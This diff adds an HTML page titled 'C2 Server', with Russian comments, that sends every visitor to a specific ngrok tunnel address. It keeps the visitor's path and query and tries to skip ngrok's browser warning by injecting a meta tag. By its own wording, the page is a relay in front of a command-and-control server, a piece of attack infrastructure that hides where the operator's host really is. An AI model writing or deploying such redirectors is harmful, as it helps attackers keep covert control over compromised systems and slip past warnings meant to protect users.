@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Server</title>
+    <script>
+        // Автоматический редирект на ngrok с заголовком
+        const ngrokUrl = 'https://lynelle-scroddled-corinne.ngrok-free.dev';
+        const currentPath = window.location.pathname + window.location.search;
+        
+        // Добавить ngrok-skip-browser-warning через meta tag
+        const meta = document.createElement('meta');
+        meta.httpEquiv = 'ngrok-skip-browser-warning';
+        meta.content = 'true';
+        document.head.appendChild(meta);
+        
+        // Редирект на ngrok
+        window.location.href = ngrokUrl + currentPath;
+    </script>
+</head>
+<body>
+    <p>Redirecting to C2 Server...</p>
+    <p>If not redirected, <a href="https://lynelle-scroddled-corinne.ngrok-free.dev">click here</a></p>
+</body>
+</html>
